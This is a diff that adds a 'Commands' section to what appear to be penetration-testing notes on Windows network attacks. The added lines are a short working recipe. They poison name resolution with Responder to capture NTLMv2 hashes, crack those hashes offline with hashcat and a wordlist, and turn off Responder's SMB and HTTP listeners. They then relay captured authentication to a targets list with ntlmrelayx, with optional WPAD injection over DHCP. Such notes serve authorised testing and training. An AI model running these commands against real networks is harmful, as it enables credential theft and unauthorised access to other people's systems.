@@ -31,4 +31,28 @@ e.g.
 - NTLM Relay     - (Relay auth to SMB/HTTP/LDAP/MSQL/others...)
 - IPv6/mitm6     - (Abuse IPv6 NameResolver to trigger NTLM auth)
 
+## Commands
 
+### Сapture & Сrack 
+Responder does everything and then logs the NTLMv2 hash - Then you crack offline.
+```bash
+sudo responder -I wlan0 -wF
+# hashes - /usr/share/responder/logs/
+hashcat -m 5600 hash.txt rockyou.txt
+```
+
+### Relay
+We don't really wanna Responder to handle, we wanna forward. 
+So we mute Responder's listeners using ntlmrelayx listen.
+```bash
+# /etc/responder/Responder.conf
+SMB  = Off      # free up 445 for ntlmrelayx
+HTTP = Off      # free up 80  for ntlmrelayx
+```
+```bash
+# Term1 - listening on ports
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# Term2 - Poisoning
+sudo responder -I wlan0 -dwF      # -d = inject WPAD via DHCP as well (tho much noise)
+```
